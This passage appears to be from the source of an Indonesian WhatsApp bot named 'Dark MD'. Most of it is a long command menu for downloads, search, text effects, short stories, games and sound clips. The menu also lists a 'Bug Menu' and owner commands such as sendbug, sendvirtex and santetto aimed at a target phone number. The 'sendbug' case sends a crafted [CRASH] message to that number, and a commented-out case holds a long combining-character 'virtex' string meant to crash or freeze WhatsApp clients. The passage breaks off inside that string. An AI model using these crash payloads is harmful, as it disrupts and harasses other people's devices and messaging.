╠➥ ${prefix}ytmp3 [url]
╠➥ ${prefix}ytmp4 [url]
╠➥ ${prefix}getmusic [query]
╠➥ ${prefix}getvideo [query]
╠➥ ${prefix}umma [url]
╠➥ ${prefix}joox [query]
╠➥ ${prefix}soundcloud [url]
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Search Menu*

╠➥ ${prefix}play [query]
╠➥ ${prefix}yts [query]
╠➥ ${prefix}google [query]
╠➥ ${prefix}gimage [query]
╠➥ ${prefix}pinterest [query]
╠➥ ${prefix}wallpaper [query]
╠➥ ${prefix}wikimedia [query]
╠➥ ${prefix}ytsearch [query]
╠➥ ${prefix}ringtone [query]
╠➥ ${prefix}stalk [option] [query]
╠➥ ${prefix}shopee [queey]
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Bug Menu*

╠➥ ${prefix}co
╠➥ ${prefix}cu
╠➥ ${prefix}ci
╠➥ ${prefix}ca
╠➥ ${prefix}bugstik
╠➥ ${prefix}bugvn
╠➥ ${prefix}bro
╠➥ ${prefix}lokas
╠➥ ${prefix}bugbcimage
╠➥ ${prefix}santetdia
╠➥ ${prefix}santetgc
╠➥ ${prefix}bugie
╠➥ ${prefix}jadibug1
╠➥ ${prefix}jadibug2
╠➥ ${prefix}jadibug3
╠➥ ${prefix}jadibug4
╠➥ ${prefix}jadibug5
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Random Menu*

╠➥ ${prefix}gbtku
╠➥ ${prefix}coffe
╠➥ ${prefix}quotesanime
╠➥ ${prefix}motivasi
╠➥ ${prefix}dilanquote
╠➥ ${prefix}bucinquote
╠➥ ${prefix}katasenja
╠➥ ${prefix}puisi
╠➥ ${prefix}couple
╠➥ ${prefix}anime
╠➥ ${prefix}waifu
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Text Pro Menu*

╠➥ ${prefix}3dchristmas
╠➥ ${prefix}3ddeepsea
╠➥ ${prefix}americanflag
╠➥ ${prefix}3dscifi
╠➥ ${prefix}3drainbow
╠➥ ${prefix}3dwaterpipe
╠➥ ${prefix}halloweenskeleton
╠➥ ${prefix}sketch
╠➥ ${prefix}bluecircuit
╠➥ ${prefix}space
╠➥ ${prefix}metallic
╠➥ ${prefix}fiction
╠➥ ${prefix}greenhorror
╠➥ ${prefix}transformer
╠➥ ${prefix}berry
╠➥ ${prefix}thunder
╠➥ ${prefix}magma
╠➥ ${prefix}3dcrackedstone
╠➥ ${prefix}3dneonlight
╠➥ ${prefix}impressiveglitch
╠➥ ${prefix}naturalleaves
╠➥ ${prefix}fireworksparkle
╠➥ ${prefix}matrix
╠➥ ${prefix}dropwater
╠➥ ${prefix}harrypotter
╠➥ ${prefix}foggywindow
╠➥ ${prefix}neondevils
╠➥ ${prefix}christmasholiday
╠➥ ${prefix}3dgradient
╠➥ ${prefix}blackpink
╠➥ ${prefix}gluetext
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Photo Oxy Menu*

╠➥ ${prefix}shadow
╠➥ ${prefix}romantic
╠➥ ${prefix}smoke
╠➥ ${prefix}burnpapper
╠➥ ${prefix}naruto
╠➥ ${prefix}lovemsg
╠➥ ${prefix}grassmsg
╠➥ ${prefix}wanted
╠➥ ${prefix}gayeffect
╠➥ ${prefix}lovetext
╠➥ ${prefix}coffecup
╠➥ ${prefix}butterfly
╠➥ ${prefix}harrypotter
╠➥ ${prefix}retrolol
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Cerpen Menu*
  
╠➥ ${prefix}Cerpen Anak
╠➥ ${prefix}Cerpen Budaya
╠➥ ${prefix}Cerpen Cinta
╠➥ ${prefix}Cerpen Cinta Islami
╠➥ ${prefix}Cerpen Cinta Pertama
╠➥ ${prefix}Cerpen Cinta Romantis
╠➥ ${prefix}Cerpen Cinta Sedih
╠➥ ${prefix}Cerpen Cinta Segitiga
╠➥ ${prefix}Cerpen Cinta Sejati
╠➥ ${prefix}Cerpen Galau
╠➥ ${prefix}Cerpen Gokil
╠➥ ${prefix}Cerpen Inspiratif
╠➥ ${prefix}Cerpen Jepang
╠➥ ${prefix}Cerpen Kehidupan
╠➥ ${prefix}Cerpen Keluarga
╠➥ ${prefix}Cerpen Kisah Nyata
╠➥ ${prefix}Cerpen Korea
╠➥ ${prefix}Cerpen Kristen
╠➥ ${prefix}Cerpen Liburan
╠➥ ${prefix}Cerpen Lingkungan
╠➥ ${prefix}Cerpen Lucu
╠➥ ${prefix}Cerpen Malaysia
╠➥ ${prefix}Cerpen Mengharukan
╠➥ ${prefix}Cerpen Misteri
╠➥ ${prefix}Cerpen Motivasi
╠➥ ${prefix}Cerpen Nasihat
╠➥ ${prefix}Cerpen Nasionalisme
╠➥ ${prefix}Cerpen Bahasa Daerah
╠➥ ${prefix}Cerpen Bahasa Inggris
╠➥ ${prefix}Cerpen Bahasa Jawa
╠➥ ${prefix}Cerpen Bahasa Sunda
╠➥ ${prefix}Cerpen Olahraga
╠➥ ${prefix}Cerpen Patah Hati
╠➥ ${prefix}Cerpen Penantian
╠➥ ${prefix}Cerpen Pendidikan
╠➥ ${prefix}Cerpen Pengalaman Pribadi
╠➥ ${prefix}Cerpen Pengorbanan
╠➥ ${prefix}Cerpen Penyesalan
╠➥ ${prefix}Cerpen Perjuangan
╠➥ ${prefix}Cerpen Perpisahan
╠➥ ${prefix}Cerpen Persahabatan
╠➥ ${prefix}Cerpen Petualangan
╠➥ ${prefix}Cerpen Ramadhan
╠➥ ${prefix}Cerpen Remaja
╠➥ ${prefix}Cerpen Renungan
╠➥ ${prefix}Cerpen Rindu
╠➥ ${prefix}Cerpen Rohani
╠➥ ${prefix}Cerpen Romantis
╠➥ ${prefix}Cerpen Sastra
╠➥ ${prefix}Cerpen Sedih
╠➥ ${prefix}Cerpen Sejarah
╠➥ ${prefix}Cerpen Slice Of Life
╠➥ ${prefix}Cerpen Terjemahan
╠➥ ${prefix}Cerpen Thriller
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Ephoto Menu*

╠➥ ${prefix}ffcover
╠➥ ${prefix}crossfire
╠➥ ${prefix}galaxy
╠➥ ${prefix}glass
╠➥ ${prefix}neon
╠➥ ${prefix}beach
╠➥ ${prefix}blackpink
╠➥ ${prefix}igcertificate
╠➥ ${prefix}ytcertificate
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Fun Menu*

╠➥ ${prefix}simih
╠➥ ${prefix}halah
╠➥ ${prefix}hilih
╠➥ ${prefix}huluh
╠➥ ${prefix}heleh
╠➥ ${prefix}holoh
╠➥ ${prefix}jadian
╠➥ ${prefix}jodohku
╠➥ ${prefix}apakah
╠➥ ${prefix}bisakah
╠➥ ${prefix}kapan
╠➥ ${prefix}slot
╠➥ ${prefix}delttt
╠➥ ${prefix}tictactoe
╠➥ ${prefix}family100
╠➥ ${prefix}tebak [option]
╠➥ ${prefix}math [mode]
╠➥ ${prefix}suitpvp [@tag]
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Primbon Menu*

╠➥ ${prefix}nomorhoki
╠➥ ${prefix}artimimpi
╠➥ ${prefix}artinama
╠➥ ${prefix}ramaljodoh
╠➥ ${prefix}ramaljodohbali
╠➥ ${prefix}suamiistri
╠➥ ${prefix}ramalcinta
╠➥ ${prefix}cocoknama
╠➥ ${prefix}pasangan
╠➥ ${prefix}jadiannikah
╠➥ ${prefix}sifatusaha
╠➥ ${prefix}rezeki
╠➥ ${prefix}pekerjaan
╠➥ ${prefix}nasib
╠➥ ${prefix}penyakit
╠➥ ${prefix}tarot
╠➥ ${prefix}fengshui
╠➥ ${prefix}haribaik
╠➥ ${prefix}harisangar
╠➥ ${prefix}harisial
╠➥ ${prefix}nagahari
╠➥ ${prefix}arahrezeki
╠➥ ${prefix}peruntungan
╠➥ ${prefix}weton
╠➥ ${prefix}karakter
╠➥ ${prefix}keberuntungan
╠➥ ${prefix}memancing
╠➥ ${prefix}masasubur
╠➥ ${prefix}zodiak
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Convert Menu*

╠➥ ${prefix}attp
╠➥ ${prefix}ttp
╠➥ ${prefix}toimage
╠➥ ${prefix}removebg
╠➥ ${prefix}sticker
╠➥ ${prefix}emojimix
╠➥ ${prefix}emojimix2
╠➥ ${prefix}tovideo
╠➥ ${prefix}togif
╠➥ ${prefix}tourl
╠➥ ${prefix}tovn
╠➥ ${prefix}tomp3
╠➥ ${prefix}toaudio
╠➥ ${prefix}ebinary
╠➥ ${prefix}dbinary
╠➥ ${prefix}styletext
╠➥ ${prefix}smeme
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Main Menu*

╠➥ ${prefix}ping
╠➥ ${prefix}owner
╠➥ ${prefix}report
╠➥ ${prefix}delete
╠➥ ${prefix}infochat
╠➥ ${prefix}quoted
╠➥ ${prefix}listpc
╠➥ ${prefix}listgc
╠➥ ${prefix}listonline
╠➥ ${prefix}speedtest
╠➥ ${prefix}menfes
╠➥ ${prefix}tinyurl
╠➥ ${prefix}isgd
╠➥ ${prefix}vurl
╠➥ ${prefix}clp
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Database Menu*
  
╠➥ ${prefix}setcmd
╠➥ ${prefix}listcmd
╠➥ ${prefix}delcmd
╠➥ ${prefix}lockcmd
╠➥ ${prefix}addmsg
╠➥ ${prefix}listmsg
╠➥ ${prefix}getmsg
╠➥ ${prefix}delmsg
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
  *Anonymous Menu*
  
╠➥ ${prefix}anonymous
╠➥ ${prefix}start
╠➥ ${prefix}next
╠➥ ${prefix}keluar
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
   *Islamic Menu*
   
╠➥ ${prefix}iqra
╠➥ ${prefix}hadist
╠➥ ${prefix}alquran
╠➥ ${prefix}juzamma
╠➥ ${prefix}tafsirsurah

════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
    *Internet Menu*
    
╠➥ ${prefix}internetmenu

════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
    *Voice Changer*
    
╠➥ ${prefix}bass
╠➥ ${prefix}blown
╠➥ ${prefix}deep
╠➥ ${prefix}earrape
╠➥ ${prefix}fast
╠➥ ${prefix}fat
╠➥ ${prefix}nightcore
╠➥ ${prefix}reverse
╠➥ ${prefix}robot
╠➥ ${prefix}slow
╠➥ ${prefix}tupai
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
   *Premium Menu*
   
╠➥ ${prefix}meme
╠➥ ${prefix}meme2
╠➥ ${prefix}tribun
╠➥ ${prefix}pantun
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
      *Owner Menu*
      
╠➥ ${prefix}react [emoji]
╠➥ ${prefix}chat [option]
╠➥ ${prefix}join [link]
╠➥ ${prefix}addprem
╠➥ ${prefix}delprem
╠➥ ${prefix}listprem
╠➥ ${prefix}leave
╠➥ ${prefix}block @user
╠➥ ${prefix}unblock @user
╠➥ ${prefix}setppbot [image]
╠➥ ${prefix}setexif
╠➥ ${prefix}setmenu [option]
╠➥ ${prefix}troli [ danger ]
╠➥ ${prefix}sendbug [no target]
╠➥ ${prefix}virtexto [no target]
╠➥ ${prefix}create [nama grup]
╠➥ ${prefix}sendvirtex [no target]
╠➥ ${prefix}momoto [no target]
╠➥ ${prefix}helloto [no target]
╠➥ ${prefix}virkon [no target]
╠➥ ${prefix}santetto [no target]
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
   *Sound Menu*

╠➥ ${prefix}sound1
╠➥ ${prefix}sound2
╠➥ ${prefix}sound3
╠➥ ${prefix}sound4
╠➥ ${prefix}sound5
╠➥ ${prefix}sound6
╠➥ ${prefix}sound7
╠➥ ${prefix}sound8
╠➥ ${prefix}sound9
╠➥ ${prefix}sound10
╠➥ ${prefix}sound11
╠➥ ${prefix}sound12
╠➥ ${prefix}sound13
╠➥ ${prefix}sound14
╠➥ ${prefix}sound15
╠➥ ${prefix}sound16
╠➥ ${prefix}sound17
╠➥ ${prefix}sound18
╠➥ ${prefix}sound19
╠➥ ${prefix}sound20
╠➥ ${prefix}sound21
╠➥ ${prefix}sound22
╠➥ ${prefix}sound23
╠➥ ${prefix}sound24
╠➥ ${prefix}sound25
╠➥ ${prefix}sound26
╠➥ ${prefix}sound27
╠➥ ${prefix}sound28
╠➥ ${prefix}sound29
╠➥ ${prefix}sound30
╠➥ ${prefix}sound31
╠➥ ${prefix}sound32
╠➥ ${prefix}sound33
╠➥ ${prefix}sound34
╠➥ ${prefix}sound35
╠➥ ${prefix}sound36
╠➥ ${prefix}sound37
╠➥ ${prefix}sound38
╠➥ ${prefix}sound39
╠➥ ${prefix}sound40
╠➥ ${prefix}sound41
╠➥ ${prefix}sound42
╠➥ ${prefix}sound43
╠➥ ${prefix}sound44
╠➥ ${prefix}sound45
╠➥ ${prefix}sound46
╠➥ ${prefix}sound47
╠➥ ${prefix}sound48
╠➥ ${prefix}sound49
╠➥ ${prefix}sound50
╠➥ ${prefix}sound51
╠➥ ${prefix}sound52
╠➥ ${prefix}sound53
╠➥ ${prefix}sound54
╠➥ ${prefix}sound55
╠➥ ${prefix}sound56
╠➥ ${prefix}sound57
╠➥ ${prefix}sound58
╠➥ ${prefix}sound59
╠➥ ${prefix}sound60
╠➥ ${prefix}sound61
╠➥ ${prefix}sound62
╠➥ ${prefix}sound63
╠➥ ${prefix}sound64
╠➥ ${prefix}sound65
╠➥ ${prefix}sound66
╠➥ ${prefix}sound67
╠➥ ${prefix}sound68
╠➥ ${prefix}sound69
╠➥ ${prefix}sound70
╠➥ ${prefix}sound71
╠➥ ${prefix}sound72
╠➥ ${prefix}sound73
╠➥ ${prefix}sound74
╠➥ ${prefix}sound75
╠➥ ${prefix}sound76
╠➥ ${prefix}sound77
╠➥ ${prefix}sound78
╠➥ ${prefix}sound79
╠➥ ${prefix}sound80
╠➥ ${prefix}sound81
╠➥ ${prefix}sound82
╠➥ ${prefix}sound83
╠➥ ${prefix}sound84
╠➥ ${prefix}sound85
╠➥ ${prefix}sound86
╠➥ ${prefix}sound87
╠➥ ${prefix}sound88
╠➥ ${prefix}sound89
╠➥ ${prefix}sound90
╠➥ ${prefix}sound91
╠➥ ${prefix}sound92
╠➥ ${prefix}sound93
╠➥ ${prefix}sound94
╠➥ ${prefix}sound95
╠➥ ${prefix}sound96
╠➥ ${prefix}sound97
╠➥ ${prefix}sound98
╠➥ ${prefix}sound99
╠➥ ${prefix}sound100
╠➥ ${prefix}sound101
╠➥ ${prefix}sound102
╠➥ ${prefix}sound103
╠➥ ${prefix}sound104
╠➥ ${prefix}sound105
╠➥ ${prefix}sound106
╠➥ ${prefix}sound107
╠➥ ${prefix}sound108
╠➥ ${prefix}sound109
╠➥ ${prefix}sound110
╠➥ ${prefix}sound111
╠➥ ${prefix}sound112
╠➥ ${prefix}sound113
╠➥ ${prefix}sound114
╠➥ ${prefix}sound115
╠➥ ${prefix}sound116
╠➥ ${prefix}sound117
╠➥ ${prefix}sound118
╠➥ ${prefix}sound119
╠➥ ${prefix}sound120
╠➥ ${prefix}sound121
╠➥ ${prefix}sound122
╠➥ ${prefix}sound123
╠➥ ${prefix}sound124
╠➥ ${prefix}sound125
╠➥ ${prefix}sound126
╠➥ ${prefix}sound127
╠➥ ${prefix}sound128
╠➥ ${prefix}sound129
╠➥ ${prefix}sound130
╠➥ ${prefix}sound131
╠➥ ${prefix}sound132
╠➥ ${prefix}sound133
╠➥ ${prefix}sound134
╠➥ ${prefix}sound135
╠➥ ${prefix}sound136
╠➥ ${prefix}sound137
╠➥ ${prefix}sound138
╠➥ ${prefix}sound139
╠➥ ${prefix}sound140
╠➥ ${prefix}sound141
╠➥ ${prefix}sound142
╠➥ ${prefix}sound143
╠➥ ${prefix}sound144
╠➥ ${prefix}sound145
╠➥ ${prefix}sound146
╠➥ ${prefix}sound147
╠➥ ${prefix}sound148
╠➥ ${prefix}sound149
╠➥ ${prefix}sound150
╠➥ ${prefix}sound151
╠➥ ${prefix}sound152
╠➥ ${prefix}sound153
╠➥ ${prefix}sound154
╠➥ ${prefix}sound155
╠➥ ${prefix}sound156
╠➥ ${prefix}sound157
╠➥ ${prefix}sound158
╠➥ ${prefix}sound159
╠➥ ${prefix}sound160
╠➥ ${prefix}sound161
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
     *Change Logs*
     
╠➥ ${prefix}meme2
╠➥ ${prefix}tribun
╠➥ ${prefix}pantun
╠➥ ${prefix}Store
╠➥ ${prefix}create
╠➥ ${prefix}shopee
════〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙═════ 
`
                let buttons = [{ buttonId: 'donasi', buttonText: { displayText: 'Donasi' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'Rules' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, anu, nyoutube, m, {mentions: ments, quoted: fkontak})
            }
            break
case 'sendbug':
if (!isCreator) throw mess.owner
if (!text) throw `sendbug 628xxxxx`
let finv1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": ` [CRASH]`, 
"caption": ` [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
danta.sendMessage(m.chat, {text:"LOADING...."},{quoted: m})
danta.sendMessage(`${text}@s.whatsapp.net`, {text:"DANTA GANZ [CRASH]"},{quoted: doc})
m.reply(`Berhasil Mengirim Bug Ke Nomer ${text}`)
break
/*case 'virtex16':
if (!isCreator) throw mess.owner
danta.sendMessage({ image: fs.readFileSync('./image/pict.jpg') }, { upload: danta.waUploadToServer })
lzain = `🛒𝐁𝐔𝐆 𝐓𝐑𝐎𝐋𝐈🎈
⃢ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟